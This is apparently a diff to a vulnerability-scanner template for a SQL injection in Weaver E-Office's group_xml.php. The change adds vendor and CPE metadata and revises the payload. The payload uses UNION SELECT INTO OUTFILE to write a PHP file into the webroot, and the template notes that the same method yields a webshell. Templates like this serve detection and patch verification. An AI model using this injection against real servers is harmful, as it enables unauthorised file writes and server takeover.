@@ -7,16 +7,21 @@ info:
   description: |
     There is a SQL injection vulnerability in the Panwei OA E-Office group_xml.php file. Through the vulnerability, an attacker can write to the Webshell file to obtain server permissions.
   reference:
-    - http://wiki.peiqi.tech/wiki/oa/泛微OA/泛微OA%20E-Office%20group_xml.php%20SQL注入漏洞.html
+    - http://wiki.peiqi.tech/wiki/oa/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20E-Office%20group_xml.php%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html
     - https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/oa/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20E-Office%20group_xml.php%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  classification:
+    cpe: cpe:2.3:a:weaver:e-office:*:*:*:*:*:*:*:*
   metadata:
     verified: true
     max-request: 2
+    vendor: weaver
+    product: e-office
     fofa-query: app="泛微-EOffice"
-  tags: weaver,e-office,oa,sqli
+  tags: weaver,e-office,oa,sqli,vuln
 variables:
   filename: "{{to_lower(rand_base(5))}}"
-  payload: "[group]:[1]|[groupid]:[1 union select '<?php echo md5(weaver);?>',2,3,4,5,6,7,8 into outfile '../webroot/{{filename}}.php']"
+  string: "weaver-group-xml-sqli"
+  payload: "[group]:[1]|[groupid]:[1 union select '<?php echo md5(\"{{string}}\");unlink(__FILE__);?>',2,3,4,5,6,7,8 into outfile '../webroot/{{filename}}.php']"
 
 http:
   - raw:
@@ -33,10 +38,9 @@ http:
       - type: word
         part: body_2
         words:
-          - "758058d8987e7a9ec723bcdbec6c407e"
+          - '{{md5(string)}}'
 
       - type: status
         status:
           - 200
-
-# digest: 4a0a00473045022077648b155365e5062f6fae7f30ac8e55fb206c6ddcc3fff6410d06c4d8f98510022100a68ed8e143bd838c10ddf987e370bc070f45e91488cb7ba9caa4b06f630860be:922c64590222798bb761d5b6d8e72950
+# digest: 490a0046304402202c3356eddb946973a2e1f032f0ca66ac27826684f8e3257df3d1133fc4ddad9d0220786700290ba89f7e450b1bbeb7629bf8dfca00305a9877eb1e3b9bc7926ef592:922c64590222798bb761d5b6d8e72950
